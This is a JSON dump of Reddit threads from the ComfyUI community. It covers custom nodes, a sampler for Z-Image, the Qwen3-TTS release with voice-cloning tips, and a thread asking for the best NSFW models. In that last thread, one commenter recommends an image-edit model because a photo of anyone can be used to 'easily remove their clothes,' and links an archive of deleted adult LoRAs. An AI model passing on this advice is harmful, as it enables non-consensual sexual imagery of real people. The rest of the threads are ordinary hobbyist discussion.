              "text": "Thanks for the feedback, this is weird, I do not use midjourney but I will check if there is an issue with the final prompt formatting. Is the camera angle the only issue you have or do you also have any other issues when it comes to prompt adherence?\nFor now (if you want), you can try to use another model format or try to copy the generated prompt in a regular CLIP text encode to see if the issue really comes with my node or the prompt itself",
              "score": 1,
              "created_utc": "2026-01-21 22:38:38",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0zcj3j",
          "author": "SheepherderNo6921",
          "text": "very interesting! Congratulations, it looks fantastic :D",
          "score": 1,
          "created_utc": "2026-01-22 03:15:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o128jjz",
              "author": "shamomylle",
              "text": "Thanks for the kind words :)",
              "score": 1,
              "created_utc": "2026-01-22 15:33:29",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16u09l",
          "author": "Kaoru-Kun",
          "text": "Hey firstly, thank you so much! I manually do similar inputs so I know this tool will save me so much time!!\n\nIn your video you can scroll through the options. When I added it to my workflow, I don‚Äôt get the scroll bar (just one super large list) and therefore I can‚Äôt see the preview when I am selecting some of the options at the bottom of the list.¬†\nThe whole node seems to be locked in on its size, how can that be fixed?¬†",
          "score": 1,
          "created_utc": "2026-01-23 05:38:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o176zqh",
              "author": "shamomylle",
              "text": "Hello, thank you for your feedback!  \nSorry to hear you are getting an issue with the scrolling, are both nodes acting the same way? Did you try to rescale the node, delete them and add them again in the project? Also if you install/update the nodes while your ComfyUI session is open it might mess with the cache files or not work properly.  \nJust for test I redownloaded and reinstalled the node from the github repository and it behaves normally.\n\nLet me know if anything worked.",
              "score": 2,
              "created_utc": "2026-01-23 07:23:05",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o17a5tj",
                  "author": "Kaoru-Kun",
                  "text": "Hi, thanks for the quick feedback. Sorry, giving input to what I have tried would have helped the discussion (thought in hindsight).¬†\n\nI installed the node directly by cloning the GitHub repository into my folder which worked fine.¬†\n\nAfter inserting the node into the workflow, I can expand the node to make it bigger, but somehow it cannot be resized to anything smaller than the list.¬†\n\nThis is the same for both nodes that come with the tool.¬†\n\nAn update and restart to comfy don‚Äôt fix it.¬†\n\nI‚Äôm running Comfy 3.39.2.¬†\n\nAnyway, no big deal. I love the tool a lot and am using it from the website now to help design the prompt.¬†\nPerhaps this weekend I‚Äôll try to look into the issue more and if I can work something out I‚Äôll post my solution here.¬†",
                  "score": 1,
                  "created_utc": "2026-01-23 07:51:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qkowfo",
      "title": "Creative Code",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/yoec80at83fg1",
      "author": "skbphy",
      "created_utc": "2026-01-23 11:58:30",
      "score": 154,
      "num_comments": 15,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkowfo/creative_code/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o184mdx",
          "author": "LeKhang98",
          "text": "ELI5 please? Is it a node that I can put simple code directly into it to process input (image, latent, audio, etc)? As a non-coder I'd love to be able to do that.",
          "score": 5,
          "created_utc": "2026-01-23 12:15:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o186h4q",
              "author": "skbphy",
              "text": "It‚Äôs a creative coding node (GLSL/ShaderToy + p5.js) that renders images/animation frames in ComfyUI. Even if you don‚Äôt code, you can use built-in animations and the AI(ollama) helper. The focus is visuals/animation, not general audio processing(You *can* use the rendered image in latent workflows by encoding it back to latent), but the node itself doesn‚Äôt directly process latents.).  English isn‚Äôt my first language, but I hope I explained it clearly.",
              "score": 7,
              "created_utc": "2026-01-23 12:28:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o19ji8t",
                  "author": "LeKhang98",
                  "text": "Thank you I understand it now.",
                  "score": 2,
                  "created_utc": "2026-01-23 16:38:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o18lz63",
          "author": "FreezaSama",
          "text": "I would love to try this or similar IF it takes the input image in consideration. This node doesn't seem to do that all the times?",
          "score": 4,
          "created_utc": "2026-01-23 13:59:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18rxg1",
              "author": "skbphy",
              "text": "[https://github.com/SKBv0/ComfyUI\\_CreativeCode/blob/main/HOW\\_TO\\_USE.md#using-textures](https://github.com/SKBv0/ComfyUI_CreativeCode/blob/main/HOW_TO_USE.md#using-textures) check this out",
              "score": 1,
              "created_utc": "2026-01-23 14:29:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o18lsd5",
          "author": "bingobongo3001",
          "text": "I just love the way it looks!",
          "score": 2,
          "created_utc": "2026-01-23 13:58:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bpehf",
          "author": "pwillia7",
          "text": "Dude COOL! -- Does this work fine with the API?",
          "score": 2,
          "created_utc": "2026-01-23 22:40:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5m5z",
              "author": "skbphy",
              "text": "No idea. I haven't tested it.",
              "score": 1,
              "created_utc": "2026-01-24 00:06:58",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1jthq6",
              "author": "deadzenspider",
              "text": "I‚Äôm pretty sure you can export the JSON API for every workflow and then run it via websockets",
              "score": 1,
              "created_utc": "2026-01-25 03:03:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1jtrra",
                  "author": "pwillia7",
                  "text": "some logic nodes don't work for a reason I can't now remember",
                  "score": 1,
                  "created_utc": "2026-01-25 03:04:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o186xf5",
          "author": "ANR2ME",
          "text": "Btw, what's the output string (source code)blooked like? in which language is the output source code? ü§î",
          "score": 1,
          "created_utc": "2026-01-23 12:31:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18800c",
              "author": "skbphy",
              "text": "It simply passes the code written in the editor or settings node as a string. It‚Äôs not important on its own. I added it for automation.",
              "score": 2,
              "created_utc": "2026-01-23 12:38:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o19cj0l",
          "author": "35point1",
          "text": "So basically this is a code snippet generator node with a built in preview and customized widget ui‚Ä¶\n\nI‚Äôve never used those libraries you mentioned but does your node just spit out a js function or similar to produce a canvas animation? I really like the customization to accomplish this!",
          "score": 1,
          "created_utc": "2026-01-23 16:07:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5hz9",
              "author": "skbphy",
              "text": "Pretty much but it‚Äôs more than a snippet generator. it actually runs the code with a live preview and you can even turn // uniform ... comments into UI sliders / color pickers.  here  [https://github.com/SKBv0/ComfyUI\\_CreativeCode?tab=readme-ov-file#interactive-uniforms](https://github.com/SKBv0/ComfyUI_CreativeCode?tab=readme-ov-file#interactive-uniforms)",
              "score": 1,
              "created_utc": "2026-01-24 00:06:21",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1l0xtf",
          "author": "InoSim",
          "text": "I can't read because of video quality... are the buttons you click able to be setup ? like i create a new one with my own parameters ?",
          "score": 1,
          "created_utc": "2026-01-25 08:04:27",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qhdrg6",
      "title": "ZSampler Turbo: new sampler for Z-Image with high prompt adherence and good level of details.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qhdrg6",
      "author": "FotografoVirtual",
      "created_utc": "2026-01-19 19:18:55",
      "score": 137,
      "num_comments": 19,
      "upvote_ratio": 0.96,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qhdrg6/zsampler_turbo_new_sampler_for_zimage_with_high/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0j7tpu",
          "author": "MomentTimely8277",
          "text": "Looks good but prompt adherence is not always accurate :(. I like the simplicity of the setting, but changing cfg would be a plus. Any way nice work. here's a picture (no lora and bf16 z-image turbo + ultraflux vae, 9steps, no style applied)\n\nhttps://preview.redd.it/652it0s40deg1.png?width=1312&format=png&auto=webp&s=a6757f168efdf59152c1a8ec2842c6fdb31dd4d5",
          "score": 13,
          "created_utc": "2026-01-19 19:42:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0jh779",
              "author": "MaxDaClog",
              "text": "Love those glass beer cans üòÅ was it a mistake or prompted?",
              "score": 7,
              "created_utc": "2026-01-19 20:25:51",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0kddxq",
                  "author": "wh33t",
                  "text": "I actually wanna buy that.",
                  "score": 4,
                  "created_utc": "2026-01-19 23:03:24",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0ju45a",
                  "author": "MomentTimely8277",
                  "text": "50/50 üòÅ I asked for beer cans with the \"nervous breakdown\" logo on it",
                  "score": 3,
                  "created_utc": "2026-01-19 21:27:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0jayh6",
              "author": "FotografoVirtual",
              "text": "Thanks for the feedback! That image looks fantastic, haha.\n\nWould you be willing to share the workflows where it struggled the most? I've been using the failed attempts as a base for refining the process.\n\nRegarding enabling CFG adjustments, I'm still hesitant about that feature for a couple of reasons: generation times would roughly double, and it would add another variable to manage during testing, which significantly complicates development. But your input is really valuable and allows me to consider all angles.",
              "score": 5,
              "created_utc": "2026-01-19 19:56:39",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0jcyuq",
                  "author": "MomentTimely8277",
                  "text": "The problem is the more characters the more it goes wrong, normaly this photo is supposed to have 4  staff members but it mixed them. So i lower it to 2. The workflow is your \"photo-style-prompt-encoder\\_GGUF\"  but with these models instead.  \n\nhttps://preview.redd.it/2eex9yza4deg1.png?width=899&format=png&auto=webp&s=3a0339b5de6fc0b9c56bae1ee3ed1aad7e7742b7",
                  "score": 3,
                  "created_utc": "2026-01-19 20:05:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0lhms3",
          "author": "HareMayor",
          "text": "If it's only the sampler, just make it installable as such that is shows up in the Ksampler dropdowns, so users will have other K sampler options too...",
          "score": 7,
          "created_utc": "2026-01-20 02:41:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ki4ee",
          "author": "Whole_Disk3247",
          "text": "That's why this sub exists. Kudos !",
          "score": 3,
          "created_utc": "2026-01-19 23:28:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ja7jy",
          "author": "Yasstronaut",
          "text": "I‚Äôm not clear from the docs what sampler it uses in each phase",
          "score": 2,
          "created_utc": "2026-01-19 19:53:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0jf9kz",
              "author": "FotografoVirtual",
              "text": "All three phases use Euler.\n\nPhases 1 and 2 combined function similarly to a standard denoising process, but with two key conditions:\n\n* Phase 1 always has 2 steps and fixed sigmas, regardless of the total number of steps used.\n* There's a jump in sigmas between Phase 1 and Phase 2, there's no continuity. I'm not sure why it works, but after hundreds of tests where the final image consistently had better quality, I had to accept that this was a rule and it needed to be this way.\n\nOnce Phases 1 and 2 are complete (acting as a standard denoising process), Phase 3 begins. This is essentially a refining stage, reversing the sigmas and adding the corresponding noise.",
              "score": 4,
              "created_utc": "2026-01-19 20:16:45",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0khuow",
                  "author": "Yasstronaut",
                  "text": "Makes complete sense. This approach feels very familiar to a node for something else released a while ago and I appreciate this! I‚Äôll give this a few tests",
                  "score": 1,
                  "created_utc": "2026-01-19 23:27:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0k0r30",
          "author": "ANR2ME",
          "text": "The text looks good after 8 steps, that is because ZIT was designed for 8-step instead of 4-step, based on their github.\n\n> Decoupled-DMD is the core few-step distillation algorithm that empowers the 8-step Z-Image model.",
          "score": 1,
          "created_utc": "2026-01-19 22:00:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0kbngh",
          "author": "Illynir",
          "text": "Interesting, i will test later and make feedback. Thanks for the work.",
          "score": 1,
          "created_utc": "2026-01-19 22:54:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0n9coj",
          "author": "etupa",
          "text": "Star deserved, that's really a good implementation of z-image, results are really cool :))",
          "score": 1,
          "created_utc": "2026-01-20 10:46:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0o6f7c",
          "author": "ThiagoAkhe",
          "text": "I loved it! Props!!",
          "score": 1,
          "created_utc": "2026-01-20 14:27:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ug2x2",
          "author": "simplephoneuser",
          "text": "why does it look so fake z image",
          "score": 1,
          "created_utc": "2026-01-21 12:42:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o15d728",
          "author": "SEOldMe",
          "text": "As often, you create great things ...Thanks for all",
          "score": 0,
          "created_utc": "2026-01-23 00:27:12",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qme5g3",
      "title": "Qwen3-TTS has been officially released as open source, boasting powerful features such as speech generation, voice design, and voice cloning.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qme5g3",
      "author": "Daniel81528",
      "created_utc": "2026-01-25 08:57:56",
      "score": 132,
      "num_comments": 28,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qme5g3/qwen3tts_has_been_officially_released_as_open/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1lc0n9",
          "author": "n0714",
          "text": "is this for ComfyUI?",
          "score": 9,
          "created_utc": "2026-01-25 09:41:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1n9v1i",
              "author": "Paganator",
              "text": "[This GitHub page](https://github.com/1038lab/ComfyUI-QwenTTS) has the ComfyUI nodes.",
              "score": 9,
              "created_utc": "2026-01-25 16:51:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1mw60q",
          "author": "MisterBlackStar",
          "text": "Leaving my ComfyUI nodes here just in case, as a web UI isn't really related with this sub theme [ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
          "score": 6,
          "created_utc": "2026-01-25 15:51:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1nhu3t",
              "author": "TopTippityTop",
              "text": "Do you know if there's any way to do realtime streaming in comfy?¬†",
              "score": 2,
              "created_utc": "2026-01-25 17:25:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1l7mj4",
          "author": "Gloomy-Radish8959",
          "text": "Exciting!",
          "score": 2,
          "created_utc": "2026-01-25 09:02:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1o4wj6",
          "author": "OkBill2025",
          "text": "I'll stick with VibeVoice",
          "score": 2,
          "created_utc": "2026-01-25 19:01:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1obypa",
              "author": "MrWeirdoFace",
              "text": "Question, can you remind me what happened with it?  Rather I never got around to testing it but I know there was some controversy and they temporarily pulled it to replace the models.   I've been sitting a a pre-pull copy but haven't taken a look.",
              "score": 3,
              "created_utc": "2026-01-25 19:31:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1qy4km",
                  "author": "OkBill2025",
                  "text": "It's from the previous version. I don't know what happened, but I'm still using the old model.",
                  "score": 1,
                  "created_utc": "2026-01-26 02:51:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1le4gv",
          "author": "PleasantAd2256",
          "text": "Comfyui workflow?",
          "score": 3,
          "created_utc": "2026-01-25 10:00:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1lhsug",
          "author": "Mirandah333",
          "text": "Anyone was able to clone a voice? For me it fails completely...",
          "score": 2,
          "created_utc": "2026-01-25 10:33:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lv1s7",
              "author": "aeroumbria",
              "text": "It appears to work slightly better with captioned input vs audio alone, but it is really only similar in vocal quality and not speech patterns and mannerism as well, like VibeVoice. I suppose the custom voice model is supposed to pick up the task of adding these qualities, but not sure if these two modes can be combined together.",
              "score": 5,
              "created_utc": "2026-01-25 12:24:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n1d50",
              "author": "fartshitcumpiss",
              "text": "The voice cloner works perfectly for me, you just need to provide an accurate transcript of the sample. If you're having issues with the cloned voice sounding bland, crank up the temperature and top\\_k, and maybe the repetition penalty. The weirder the voice, the more temp and top\\_k you need. Also, seed matters, so just generate repeatedly with random seeds until you get a good one.",
              "score": 4,
              "created_utc": "2026-01-25 16:14:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1n3tgs",
                  "author": "Mirandah333",
                  "text": "Thnaks, need to try more and insist more. It was a first bad impression",
                  "score": 2,
                  "created_utc": "2026-01-25 16:25:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1lw5r8",
              "author": "JScoobyCed",
              "text": "I have been using Spark-TTS (self-hosted) in a project last year and it was amazing. You just need a 5-10 second audio sample. Make sure the audio sample rate is 16k, preferably .wav, and no pause/silence in it (or it will generate voice with silence parts)",
              "score": 2,
              "created_utc": "2026-01-25 12:33:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1n8x8c",
              "author": "HolidayWheel5035",
              "text": "I‚Äôm using comfyui nodes but yes the clone works perfect.   Way better than vibevoice imho",
              "score": 1,
              "created_utc": "2026-01-25 16:47:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1p87qo",
              "author": "niord",
              "text": "Works perfect without extra caption.\n\nJust remember to have the 'something x vectors only' switched to true on the node if you feed it with audio and no caption.",
              "score": 1,
              "created_utc": "2026-01-25 21:53:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1lpkwz",
              "author": "Daniel81528",
              "text": "How could that be? My tests are all working fine, what's wrong with you?",
              "score": -1,
              "created_utc": "2026-01-25 11:41:14",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lrhpb",
                  "author": "Mirandah333",
                  "text": "It produces a voice that changes over time",
                  "score": 1,
                  "created_utc": "2026-01-25 11:56:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1mndp9",
          "author": "XonikzD",
          "text": "Is it as good a index-tts2?",
          "score": 1,
          "created_utc": "2026-01-25 15:11:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nhnb6",
          "author": "TopTippityTop",
          "text": "Does anyone know whether there's a way to do realtime streaming in comfy? How does that aspect work?",
          "score": 1,
          "created_utc": "2026-01-25 17:24:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1p2f5a",
          "author": "Mythril_Zombie",
          "text": "How fast is it?",
          "score": 1,
          "created_utc": "2026-01-25 21:27:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1p9dgu",
              "author": "niord",
              "text": "On my laptop (rtx 4080 mobile 12gb) a 30s TTS takes 3-5min to 'render' (that is with around 1m voice sample as base).",
              "score": 2,
              "created_utc": "2026-01-25 21:58:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1px5si",
                  "author": "harrro",
                  "text": "You sure it's using the GPU? It should be way faster than that.",
                  "score": 2,
                  "created_utc": "2026-01-25 23:46:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qhppi7",
      "title": "What are the best NSFW Models?",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qhppi7/what_are_the_best_nsfw_models/",
      "author": "Firm-Struggle8183",
      "created_utc": "2026-01-20 03:16:18",
      "score": 130,
      "num_comments": 49,
      "upvote_ratio": 0.84,
      "text": "Trying to create some custom NSFW image to video workflows, and struggling to figure out what models are best for this.\n\nIs there a list somewhere?",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qhppi7/what_are_the_best_nsfw_models/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o0m7l3h",
          "author": "GregBahm",
          "text": "I think Civitas is basically that list.\n\nAI smut is a pretty broad category. You got your photorealistic smut. You got your anime smut. You got your smut that does boring shit well. You got your smut that does prompt adherence well (but doesn't beat the boring models at boring shit.)\n\nThe video part is easy. Smutty fine-tunes of Wan2.2 will get any image moving and grooving. Wan 2.2 Enhanced NSFW is number 1 on civitas for a reason. It's the best. Image-to-Image will get you to where ever you want to go, so the problem is thus reduced to an image (de)generation problem.\n\nFor photoreal image smut, you can use Flux or Qwen or Z-Image probably. They will all give you exactly what you want as long as you plug in the right LoRA and are willing to settle for something that is mostly 1girl.\n\nFor anime image smut, a lot of people seem to go for Illustrious or Pony. If you're willing to settle for something mostly 1girl, these models will also trivially do anything you'd ever want.\n\nThe hardest thing is getting 2+ characters interacting without it looking like some horror show dreamed up by the worshippers of slaanesh. The state of the AI art today is that, to get two characters interacting with a lot of prompt adherence, people start sprouting extra fingers and legs and dicks. So you can either wrestle your way through that (with control nets and in-painting and a lot of random chance) or settle for something more generic.",
          "score": 189,
          "created_utc": "2026-01-20 05:16:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0mk7yi",
              "author": "kirmm3la",
              "text": "The this guy knows his smut.",
              "score": 99,
              "created_utc": "2026-01-20 06:55:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0mw8hi",
                  "author": "Pope_Phred",
                  "text": "And his 1girls, apparently.",
                  "score": 33,
                  "created_utc": "2026-01-20 08:43:49",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o15d8vk",
                  "author": "NoLiterature4575",
                  "text": "This guy smuts",
                  "score": 1,
                  "created_utc": "2026-01-23 00:27:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0ms3mi",
              "author": "meoli",
              "text": "\"worshippers of slaanesh\" made me chuckle there.",
              "score": 24,
              "created_utc": "2026-01-20 08:05:13",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0o73mu",
              "author": "uniquelyavailable",
              "text": "I feel that the available NSFW checkpoints and loras are still a far cry of where we should be in the NSFW space for Ai generation. The amount of work it takes to produce a fantastic and anatomically correct netheryea with even the best workflow is on par with building a cabin in the woods and still leaves a lot to be desired.",
              "score": 11,
              "created_utc": "2026-01-20 14:30:45",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0opqzy",
              "author": "clwill00",
              "text": "Flux is a no-go below the waist. Barbie and Ken have more realism. Qwen and Zimage are better choices there.",
              "score": 5,
              "created_utc": "2026-01-20 16:02:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0mrpve",
              "author": "TheDudeWithThePlan",
              "text": "let's not forget Chroma for photo realistic",
              "score": 12,
              "created_utc": "2026-01-20 08:01:43",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0mtxen",
              "author": "tugiz1004",
              "text": "That's why adeptus mechanicus exist",
              "score": 3,
              "created_utc": "2026-01-20 08:22:07",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0nbhx0",
              "author": "Jygglewag",
              "text": "For a Godrick fan the extra hands are part of the fun",
              "score": 3,
              "created_utc": "2026-01-20 11:05:08",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0qzrbv",
              "author": "FrolickingFox4",
              "text": "I've only played around with it a little so far (all Wan2.2 based) but it seems like you can really tell what sort of smut it was trained on. The NSFW LoRAs I've tried have no idea what a normal human penis size is. I haven't been able to get anything less than about 9\" out of it.",
              "score": 2,
              "created_utc": "2026-01-20 22:19:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0ms22c",
              "author": "Ok_Camera2445",
              "text": "You guys mean Civiatai? And do you refer to a specific \"Wan 2.2 Enhance NSFW\"? I am not able to find this one.",
              "score": 4,
              "created_utc": "2026-01-20 08:04:50",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0negp3",
                  "author": "MysteriousMongoose92",
                  "text": "https://civitai.com/models/2053259/wan-22-enhanced-nsfw-or-svi-or-camera-prompt-adherence-lightning-edition-i2v-and-t2v-fp8-gguf",
                  "score": 16,
                  "created_utc": "2026-01-20 11:30:09",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0niq6o",
                  "author": "liquidtensionboy",
                  "text": "civitai . It's a checkpoint, I found the checkpoint just fine. Check your civitai browsing level perhaps?",
                  "score": 1,
                  "created_utc": "2026-01-20 12:03:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0piit1",
              "author": "hugo4711",
              "text": "civarchive",
              "score": 1,
              "created_utc": "2026-01-20 18:14:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0oa5vk",
              "author": "Firm-Struggle8183",
              "text": "Much appreciated.",
              "score": 0,
              "created_utc": "2026-01-20 14:46:27",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0muu78",
          "author": "Mugaluga",
          "text": "For Photorealism there are a few that stand out.\n\nIf you want to put real people (so the face and likeness matters) start with....\n\n[Phr00t/Qwen-Image-Edit-Rapid-AIO at main](https://huggingface.co/Phr00t/Qwen-Image-Edit-Rapid-AIO/tree/main)\n\nYou can put a photo of anyone in there to easily remove their clothes or get them \"into position\"\n\nZ-Image Turbo will get you photorealistic images too, but won't give you an exact person unless you use a lora.\n\nThen you move on to WAN 2.2 plus loras. There are plenty available at Civit but IMO many of the best ones were deleted. Fortunately, you can still find most of them here...\n\nIt's the loras that turn Wan2.2 from PG-13/softcore into XXX hardcore.\n\n[https://civitaiarchive.com/](https://civitaiarchive.com/)\n\nThe only problem with the photorealistic models currently is that none of them go as easily hardcore as Pony or Illustrious. There ARE mixes for realism and they'll get you most of the way there, but they do not look 100% real or like photos.\n\nBut they will create the most hardcore scenes you can probably imagine. Excellent at anatomy in complex positions of \"interactions\" that none of the truly photorealistic models can manage. They weren't trained specifically on porn - Pony was. Skip Pony 7 entirely. In fact you don't want to use ANY of the Pony base models. You want a Pony finetune.\n\nI'd recommend CyberRealisticPony and there are a few others. You can create hardcore XXX with this model. It's fast, has great anatomy and is HIGHLY knowledgeable about practically every sexual act or position you could want, and I love it! But it's NOT quite photorealism.\n\nChroma is an interesting one. It's a photorealistic model that WAS trained on porn. It exists as a halfway point. Not quite as hardcore as Pony can get but way more \"knowledgeable\" than Qwen or Z-Image Turbo. Its main drawback is sketchy anatomy compared to the others. It CAN do amazing things, but you'll ALSO get a lot of deformities. A lot of almost perfect pics ruined by that deformed foot or extra hand etc. And then BAM... exactly what you were going for.\n\nFor anime smut, you'll have to ask someone else :)",
          "score": 37,
          "created_utc": "2026-01-20 08:30:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0nkrz4",
              "author": "Mother-Food4084",
              "text": "Can you please share workflow to use run with Phr00t/Qwen-Image-Edit-Rapid-AIO.",
              "score": 2,
              "created_utc": "2026-01-20 12:18:20",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0nsp7o",
                  "author": "Whipit",
                  "text": "I'm not OP but here's the link to the \"official\" WF. I use it. It definitely works.\n\n[https://huggingface.co/Phr00t/Qwen-Image-Edit-Rapid-AIO/blob/main/Qwen-Rapid-AIO.json](https://huggingface.co/Phr00t/Qwen-Image-Edit-Rapid-AIO/blob/main/Qwen-Rapid-AIO.json)",
                  "score": 6,
                  "created_utc": "2026-01-20 13:10:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0qlqmr",
              "author": "beragis",
              "text": "Z-Image does tend to give the same or very similar person in the same environment as long as the description of the person remains consistent.",
              "score": 1,
              "created_utc": "2026-01-20 21:14:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o15dyxr",
              "author": "NoLiterature4575",
              "text": "This guy smuts too",
              "score": 1,
              "created_utc": "2026-01-23 00:31:16",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0naul2",
          "author": "zxcvbnm_mnbvcxz",
          "text": "Lustify is still my favorite",
          "score": 12,
          "created_utc": "2026-01-20 10:59:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ocz9i",
              "author": "NoElephant5027",
              "text": "i can even run it on my macbook pro m3, really like that model",
              "score": 3,
              "created_utc": "2026-01-20 15:00:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0nwkzz",
          "author": "Whipit",
